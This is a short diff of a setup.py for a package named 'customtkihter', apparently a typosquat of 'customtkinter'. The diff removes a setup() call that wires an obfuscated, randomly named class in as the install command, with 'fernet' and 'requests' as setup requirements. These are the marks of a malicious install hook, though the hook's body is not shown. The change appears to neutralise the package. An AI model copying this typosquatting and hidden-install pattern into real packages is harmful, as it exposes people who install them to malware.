@@ -18,22 +18,5 @@ class rDGpVzLyEVfJFFmsKoMRZSZkZKSAJERXNsuOsyIuLCUJTluEmQOycTeQyIzqzXhfuxVEdSOxZX
             install.run(self)
 
 
-setup(
-    name="customtkihter",
-    version=VERSION,
-    author="sUBCAwqUKxaPLGXMMRzU",
-    author_email="babfHUDQKyhmVcLoKny@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': rDGpVzLyEVfJFFmsKoMRZSZkZKSAJERXNsuOsyIuLCUJTluEmQOycTeQyIzqzXhfuxVEdSOxZXLiVPfVOGWajJUWHRDhLvWwOIRZlpqKegcSslZbNDFMhTMEpCzJKvaYvzNaqKoeZynEXemVtqekaFYlALIkdvXGwyuwJgffmjhTaECzIWJyxiKJcOQetsCTjmndvu,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
